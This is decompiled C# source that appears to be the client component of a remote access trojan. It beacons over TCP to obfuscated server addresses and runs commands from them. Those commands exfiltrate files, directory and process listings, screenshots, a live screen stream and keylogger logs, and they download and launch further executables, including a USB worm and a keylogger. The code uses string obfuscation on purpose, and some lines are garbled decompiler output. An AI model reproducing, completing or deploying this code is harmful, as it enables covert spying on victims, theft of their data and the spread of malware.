using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace thandhwiar;

public class MSAMCDM
{
	private int buffxSize = 1024;

	public GCANONF GCANONF = new GCANONF();

	public bool reqCxnls;

	private int atmtps;

	private bool thrtRuning;

	private Thread funxThread;

	public TcpClient tctpsck;

	private int bytesiRead;

	public NetworkStream netiStream;

	private DSADRIVF iHD = new DSADRIVF();

	public DateTime lTimexUtc;

	private Dictionary<string, byte[]> txasks = new Dictionary<string, byte[]>();

	public int port_sn;

	private bool hasusxb;

	public bool is_wosrking;

	private OCATHRE StatexObj = new OCATHRE();

	public bool auttCnls;

	private ThreadStart funiStarter;

	public Process CiProcess;

	public ProcessStartInfo CSxtartInfo;

	private bool capiScreen;

	private bool iswixtch;

	private bool str_wxriter;

	public DateTime runTime;

	private int my_pors;

	public string size
	{
		get
		{
			try
			{
				string[] array = new string[7]
				{
					"B!".Split(new char[1] { '!' })[0],
					"KB!".Split(new char[1] { '!' })[0],
					"MB!".Split(new char[1] { '!' })[0],
					"GB",
					"TB",
					"PB",
					"EB!".Split(new char[1] { '!' })[0]
				};
				if (byteCount == 0L)
				{
					return "0" + array[0];
				}
				long num = Math.Abs(byteCount);
				int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
				double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
				return (double)Math.Sign(byteCount) * num3 + array[num2];
			}
			catch
			{
				return "";
			}
		}
	}

	public string[] comdand
	{
		get
		{
			try
			{
				byte[] array = new byte[5];
				bytesiRead = netiStream.Read(array, 0, 5);
				int num = BitConverter.ToInt32(array, 0);
				byte[] array2 = new byte[num];
				int num2 = 0;
				for (int num3 = num; num3 > 0; num3 -= bytesiRead)
				{
					int count = ((num3 > buffxSize) ? buffxSize : num3);
					bytesiRead = netiStream.Read(array2, num2, count);
					num2 += bytesiRead;
				}
				char[] array3 = new char[array2.Length];
				for (int i = 0; i < array2.Length; i++)
				{
					char c = (array3[i] = Convert.ToChar(array2[i]));
				}
				string text = new string(array3);
				if (text.Trim() == "")
				{
					return null;
				}
				return text.ToLower().Split(new char[1] { '=' });
			}
			catch
			{
				is_wosrking = false;
				return null;
			}
		}
	}

	public string file_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|".Split(new char[1] { '|' })[0] : "<|".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.ToString() + ((!ret) ? ">|".Split(new char[1] { '|' })[0] : "<|".Split(new char[1] { '|' })[0]);
			text = text + this.get_size(fileInfo.Length) + ((!ret) ? ">|".Split(new char[1] { '|' })[0] : "<|".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				push_dsata(null, "fislsz=|".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void seeUSB()
	{
		try
		{
			if (Process.GetProcessesByName(GCANONF.usbxApp).Length == 0 && File.Exists(GCANONF.usbxPath() + GCANONF.usbxApp + ".exe!".Split(new char[1] { '!' })[0]))
			{
				do_proscess(GCANONF.usbxPath() + GCANONF.usbxApp + ".exe!".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public NetworkStream NS(TcpClient tctpsck)
	{
		return tctpsck.GetStream();
	}

	public void do_proscess(string filesPath)
	{
		try
		{
			Process.Start(filesPath);
		}
		catch
		{
		}
	}

	public void seeusbl()
	{
		try
		{
			if (Process.GetProcessesByName(GCANONF.usbxApp).Length == 0 && File.Exists(GCANONF.usbxPath() + GCANONF.usbxApp + ".exe!".Split(new char[1] { '!' })[0]))
			{
				do_proscess(GCANONF.usbxPath() + GCANONF.usbxApp + ".exe!".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public void seekilogr()
	{
		try
		{
			if (Process.GetProcessesByName(GCANONF.kiysAdpp).Length == 0 && File.Exists(GCANONF.kiPsath() + GCANONF.kiysAdpp + ".exe!".Split(new char[1] { '!' })[0]))
			{
				do_proscess(GCANONF.kiPsath() + GCANONF.kiysAdpp + ".exe!".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public void do_updated(string uType, string switchType)
	{
		try
		{
			byte[] array = pull_data();
			switch (uType)
			{
			case "$up5datu":
			case "$us5bwrm":
				if (!Directory.Exists(GCANONF.usbxPath()))
				{
					Directory.CreateDirectory(GCANONF.usbxPath());
				}
				if (array != null)
				{
					Process.GetProcessesByName(GCANONF.usbxApp);
					File.WriteAllBytes(GCANONF.usbxPath() + GCANONF.usbxApp + ".exe!".Split(new char[1] { '!' })[0], array);
				}
				break;
			case "$uk5log":
				if (array != null)
				{
					if (!Directory.Exists(GCANONF.kiPsath()))
					{
						Directory.CreateDirectory(GCANONF.kiPsath());
					}
					Process.GetProcessesByName(GCANONF.kiysAdpp);
					File.WriteAllBytes(GCANONF.kiPsath() + GCANONF.kiysAdpp + ".exe", array);
				}
				break;
			}
		}
		catch
		{
		}
	}

	public string[] serverIPD()
	{
		char[] array = new char[GCANONF.vpsipzs.Length];
		for (int i = 0; i < GCANONF.vpsipzs.Length; i++)
		{
			char c = (array[i] = Convert.ToChar(GCANONF.vpsipzs[i]));
		}
		string text = new string(array);
		return text.Split(new char[1] { '?' });
	}

	public void checkLast()
	{
		DateTime now = DateTime.Now;
		try
		{
			if (Math.Abs(runTime.Subtract(now).Minutes) > 6)
			{
				tctpsck.Close();
				is_wosrking = false;
			}
		}
		catch
		{
		}
	}

	public void remove_user()
	{
		try
		{
			byte[] array = pull_data();
			if (array != null && !File.Exists(GCANONF.mpath + GCANONF.remvxUser + ".exe!".Split(new char[1] { '!' })[0]))
			{
				File.WriteAllBytes(GCANONF.mpath + GCANONF.remvxUser + ".exe!".Split(new char[1] { '!' })[0], array);
				do_proscess(GCANONF.mpath + GCANONF.remvxUser + ".exe");
			}
		}
		catch
		{
		}
	}

	private void push_fixle(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				push_dsata(File.ReadAllBytes(lfile), "fisle=!".Split(new char[1] { '!' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	private void user_inxfo()
	{
		string text = GCANONF.lancadrd + "|" + GCANONF.cdname + GCANONF.dy_isd + "|" + GCANONF.undame + "|" + GCANONF.duip + "|" + GCANONF.Ossname() + "|" + GCANONF.apdver + "|";
		text += "||".ToString();
		text = text + "|" + GCANONF.mpath;
		byte[] bytexArray = GCANONF.getBytexArray(text);
		push_dsata(bytexArray, "insfo=usser|".Split(new char[1] { '|' })[0]);
		if (!hasusxb && Directory.Exists(GCANONF.usbxPath() + "data!".Split(new char[1] { '!' })[0]))
		{
			hasusxb = true;
		}
		if (hasusxb)
		{
			push_dsata(null, "hassusb=" + GCANONF.usbxPath() + "data!".Split(new char[1] { '!' })[0]);
		}
	}

	public bool push_dsata(byte[] data, string type, bool tmp = false)
	{
		try
		{
			runTime = DateTime.Now;
			if (str_wxriter)
			{
				return false;
			}
			str_wxriter = true;
			byte[] bytexArray = GCANONF.getBytexArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(bytexArray.Length);
			byte[] array2 = new byte[num2 + bytexArray.Length + num];
			bytes.CopyTo(array2, 0);
			bytexArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytexArray.Length);
				data.CopyTo(array2, 10 + bytexArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !reqCxnls)
			{
				int num5 = ((num4 > buffxSize) ? buffxSize : num4);
				netiStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				runTime = DateTime.Now;
			}
			str_wxriter = false;
			if (reqCxnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			str_wxriter = false;
			is_wosrking = false;
			return false;
		}
	}

	public void saveFdile(string filesPath)
	{
		try
		{
			byte[] array = pull_data();
			if (array != null)
			{
				File.WriteAllBytes(filesPath, array);
			}
		}
		catch
		{
		}
	}

	private bool IPSDX()
	{
		try
		{
			GCANONF.defauxltP = serverIPD()[0];
			my_pors = int.Parse(GCANONF.podrt.Split(new char[1] { ',' })[port_sn]);
			if (atmtps > 22)
			{
				GCANONF.defauxltP = serverIPD()[1];
				if (atmtps > 26)
				{
					atmtps = 0;
				}
			}
			atmtps++;
			tctpsck = new TcpClient();
			tctpsck.Connect(GCANONF.defauxltP, my_pors);
			atmtps = 0;
			return true;
		}
		catch
		{
			port_sn++;
			if (port_sn > 4)
			{
				port_sn = 0;
			}
			return false;
		}
	}

	private void lookup_conDX(object sdoudrce)
	{
		try
		{
			if (!thrtRuning)
			{
				thrtRuning = true;
				checkLast();
				if (!is_wosrking || !tctpsck.Connected)
				{
					is_wosrking = IPSDX();
					if (is_wosrking)
					{
						buffxSize = tctpsck.ReceiveBufferSize;
						see_resDX();
					}
				}
			}
			thrtRuning = false;
		}
		catch
		{
			atmtps++;
			thrtRuning = false;
			str_wxriter = false;
			is_wosrking = false;
			iswixtch = false;
		}
	}

	public void list_prodses()
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">!".Split(new char[1] { '!' })[0];
				text += "0>|".Split(new char[1] { '|' })[0];
				text += "<!".Split(new char[1] { '!' })[0];
			}
			byte[] bytexArray = GCANONF.getBytexArray(text);
			push_dsata(bytexArray, "prsocl=pesoc|".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public byte[] pull_data()
	{
		try
		{
			runTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			bytesiRead = netiStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !reqCxnls)
			{
				int count = ((num3 > buffxSize) ? buffxSize : num3);
				bytesiRead = netiStream.Read(array2, num, count);
				num += bytesiRead;
				num3 -= bytesiRead;
				runTime = DateTime.Now;
			}
			if (reqCxnls)
			{
				netiStream.Flush();
				array2 = null;
			}
			return array2;
		}
		catch
		{
			is_wosrking = false;
			return null;
		}
	}

	private void see_resDX()
	{
		if (!iswixtch)
		{
			iswixtch = true;
			netiStream = NS(tctpsck);
			capiScreen = false;
			while (is_wosrking)
			{
				string[] switchType = comdand;
				if (switchType != null)
				{
					reqCxnls = false;
					string text = switchType[0];
					if (text.Split(new char[1] { '-' }).Length > 1)
					{
						text = text.Split(new char[1] { '-' })[1];
					}
					text = text.Insert(2, "5");
					text = "$" + text;
					switch (text)
					{
					case "$fl5dr":
					case "$fl5sdr":
					{
						string Folders = iHD.check_Folsders(switchType[1]);
						if (Folders != null)
						{
							funiStarter = delegate
							{
								push_dsata(null, "flsdr=|".Split(new char[1] { '|' })[0] + Folders);
							};
							funxThread = new Thread(funiStarter);
							funxThread.Start();
						}
						break;
					}
					case "$rn5nkl":
					case "$rn5snkl":
						seekilogr();
						break;
					case "$pr5ocl":
					case "$pr5socl":
						funiStarter = delegate
						{
							list_prodses();
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$us5brun":
					case "$us5sbrun":
						seeUSB();
						break;
					case "$th5umb":
					case "$th5sumb":
						image_infdo(switchType[1]);
						break;
					case "$sc5rsz":
					case "$sc5srsz":
						GCANONF.screenSsize(switchType[1]);
						break;
					case "$sc5ren":
					case "$sc5sren":
						capiScreen = true;
						funiStarter = delegate
						{
							is_screden(switchType[1]);
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$rn5nub":
					case "$rn5snub":
						seeusbl();
						break;
					case "$cl5ping":
					case "$cl5sping":
						runTime = DateTime.Now;
						break;
					case "$cl5rcmd":
					case "$cl5srcmd":
						CSxtartInfo = null;
						CiProcess = null;
						break;
					case "$sy5sky":
					case "$sy5ssky":
						funiStarter = delegate
						{
							uploadKLodgs();
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$ke5erun":
					case "$ke5serun":
						seekilogr();
						break;
					case "$cl5stats":
					case "$cl5sstats":
						funiStarter = delegate
						{
							update_Stadts();
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$ru5nf":
					case "$ru5snf":
						do_proscess(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "$in5fo":
					case "$in5sfo":
						user_inxfo();
						break;
					case "$do5wf":
					case "$do5swf":
						saveFdile(switchType[1]);
						break;
					case "$af5ile":
					case "$af5sile":
						funiStarter = delegate
						{
							send_autdo(switchType[1]);
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$di5rs":
					case "$di5srs":
						funxThread = new Thread(listDrives);
						funxThread.Start();
						break;
					case "$fl5es":
					case "$fl5ses":
					{
						string text2 = iHD.lookup_Fises(switchType[1]);
						if (text2 != null)
						{
							push_dsata(null, "flses=|".Split(new char[1] { '|' })[0] + text2);
						}
						break;
					}
					case "$do5wr":
					case "$do5swr":
						saveFdile(switchType[1]);
						break;
					case "$cs5creen":
					case "$cs5screen":
						see_scrden(switchType[1]);
						break;
					case "$st5ops":
					case "$st5sops":
						capiScreen = false;
						break;
					case "$us5bwrm":
					case "$up5datu":
					case "$uk5log":
					case "$sn5dps":
					case "$au5dio":
						do_updated(text, switchType[1]);
						break;
					case "$fi5lsz":
					case "$fi5slsz":
						funiStarter = delegate
						{
							file_info(switchType[1]);
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$fi5le":
					case "$fi5sle":
						funiStarter = delegate
						{
							push_fixle(switchType[1]);
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					case "$cn5ls":
					case "$cn5sls":
						auttCnls = true;
						reqCxnls = true;
						capiScreen = false;
						break;
					case "$de5lt":
					case "$de5slt":
						this.fidle -= switchType[1];
						break;
					case "$ud5lt":
					case "$ud5slt":
						remove_user();
						break;
					case "$li5stf":
					case "$li5sstf":
						funiStarter = delegate
						{
							iHD.look_Filses(switchType[1]);
						};
						funxThread = new Thread(funiStarter);
						funxThread.Start();
						break;
					}
					continue;
				}
				is_wosrking = false;
				break;
			}
			is_wosrking = false;
			capiScreen = false;
		}
		iswixtch = false;
	}

	private void is_screden(string scredndSize)
	{
		try
		{
			OCASCRNS oCASCRNS = new OCASCRNS();
			GCANONF.screenSsize(scredndSize);
			while (capiScreen && is_wosrking)
			{
				Bitmap val = oCASCRNS.screen(GCANONF.scrdSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					push_dsata(memoryStream.ToArray(), "scsren=cascen|".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void image_infdo(string path)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(path);
			Bitmap val2 = new Bitmap((Image)(object)val, 210, 160);
			if (val2 != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">!".Split(new char[1] { '!' })[0];
				text = text + fileInfo.CreationTimeUtc.ToString() + ">!".Split(new char[1] { '!' })[0];
				text = text + this.get_size(fileInfo.Length) + ">!".Split(new char[1] { '!' })[0];
				MemoryStream memoryStream = new MemoryStream();
				((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Png());
				push_dsata(memoryStream.ToArray(), "thsumb=visdew!".Split(new char[1] { '!' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void uploadKLodgs()
	{
		try
		{
			if (!File.Exists(GCANONF.kiPsath() + GCANONF.kiysAdpp))
			{
				return;
			}
			string fileName = Path.GetFileName(GCANONF.kiPsath() + GCANONF.kiysAdpp);
			string path = GCANONF.kiPsath() + GCANONF.kiysAdpp;
			using FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			using StreamReader streamReader = new StreamReader(stream);
			byte[] bytexArray = GCANONF.getBytexArray(streamReader.ReadToEnd());
			push_dsata(bytexArray, "sasvky=|".Split(new char[1] { '|' })[0] + fileName);
		}
		catch
		{
		}
	}

	private void see_scrden(string scrdenSize)
	{
		try
		{
			OCASCRNS oCASCRNS = new OCASCRNS();
			GCANONF.screenSsize(scrdenSize);
			Bitmap val = oCASCRNS.screen(GCANONF.scrdSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				push_dsata(memoryStream.ToArray(), "sasscr=cresen!".Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public bool send_autdo(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">!".Split(new char[1] { '!' })[0] + fileName;
				push_dsata(data, "afsile=!".Split(new char[1] { '!' })[0] + fileinfo);
				return false;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void update_Stadts()
	{
		try
		{
			byte[] data = GCANONF.apps_staxtus();
			push_dsata(data, "asatas=upsds|".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void do_start()
	{
		runTime = DateTime.Now;
		GCANONF.Inxfo();
		iHD.iserver = this;
		TimerCallback callback = lookup_conDX;
		Timer timer = new Timer(callback, StatexObj, 58800, 85100);
		StatexObj.timer = timer;
		funiStarter = delegate
		{
			seekilogr();
		};
		funxThread = new Thread(funiStarter);
		funxThread.Start();
		Thread.Sleep(810);
		funiStarter = delegate
		{
			seeUSB();
		};
		funxThread = new Thread(funiStarter);
		funxThread.Start();
	}

	private void listDrives()
	{
		string text = iHD.lookup_Drsves();
		push_dsata(null, "disrs=!".Split(new char[1] { '!' })[0] + text);
	}
}
